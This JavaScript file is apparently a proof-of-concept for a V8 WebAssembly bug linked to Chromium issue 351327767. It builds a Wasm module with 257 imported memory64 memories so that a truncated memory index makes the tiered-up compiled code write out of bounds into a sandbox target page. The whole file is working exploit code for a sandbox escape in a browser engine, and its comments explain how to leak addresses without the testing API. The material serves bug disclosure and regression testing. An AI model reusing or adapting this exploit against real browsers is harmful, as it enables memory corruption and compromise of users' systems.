// --experimental-wasm-memory64 --no-wasm-trap-handler --sandbox-testing
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// Prepare corruption utilities.
// This is only used to fetch the base address of our OOB buffer.
// As described in https://issues.chromium.org/issues/351327767#comment3,
//  we already have ArrayBuffer PartitionAlloc overwrite primitives and thus
//  in a real Chrome environment can leak this without depending on corruption API.
const kHeapObjectTag = 1;
const kBackingStoreOffset = 0x24;
const kSandboxedPointerShift = 64 - 40;
const cage_base = BigInt(Sandbox.base);
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}

// memory to import
let mem = new WebAssembly.Memory({initial: 0x100, maximum: 0x100, index: 'i64'});
let mem2 = new WebAssembly.Memory({initial: 0x1, maximum: 0x1, index: 'i64'});    // oob
let mem3 = new WebAssembly.Memory({initial: 0x2, maximum: 0x2, index: 'i64'});    // oob write target for tier-up

// fetch base address
let mem2_ab = mem2.buffer;
let mem2_sbx_ptr = getField64(getPtr(mem2_ab), kBackingStoreOffset) >> BigInt(kSandboxedPointerShift);
let mem2_base = mem2_sbx_ptr + cage_base;

let builder = new WasmModuleBuilder();
for (let i = 0; i < 0x100; i++) {
  builder.addImportedMemory('import', 'mem', 0x100, 0x100, false, true);  // mem 0 ~ 0xff
}
builder.addImportedMemory('import', 'mem2', 1, 1, false, true);           // mem 0x100
let $boom = builder.addFunction("boom", makeSig([kWasmI64, kWasmI64], []))
  .exportFunc()
  .addBody([
    // https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/function-body-decoder-impl.h;drc=a300ada2d2f1cdeff14a4394407ce6502ecec9b7;l=861
    // kExprI64StoreMem, 0x40, index, offset: [i32 i64] -> []

    // cached_memory_index_ = 0x100
    kExprI64Const, 0,
    kExprLocalGet, 1,
    kExprI64StoreMem, 0x40, ...wasmUnsignedLeb(0x100), ...wasmUnsignedLeb(0),

    // https://source.chromium.org/chromium/chromium/src/+/main:v8/src/compiler/wasm-compiler.cc;drc=a300ada2d2f1cdeff14a4394407ce6502ecec9b7;l=3362
    // static_cast<uint8_t>(cached_memory_index_) == 0, re-uses memory base & length
    // index is dynamic & offset confused to be in-bounds, oob check at runtime (on certain environments)
    kExprLocalGet, 0, // dynamic index node
    kExprLocalGet, 1, // value
    kExprI64StoreMem, 0x40, ...wasmUnsignedLeb(0), ...wasmUnsignedLeb(0x20000),  // offset lands on mem3, end_offset = 0x20007
  ]);

let instance = builder.instantiate({import: {mem, mem2}});
let { boom } = instance.exports;

// --allow-natives-syntax + %WasmTierUpFunction(boom) for instant trigger
for (let i = 0; i < 0x1000000; i++) {
  boom(0x0n, 0x42n);
}
boom(BigInt(Sandbox.targetPage) - mem2_base - 0x20000n, 0x42n);
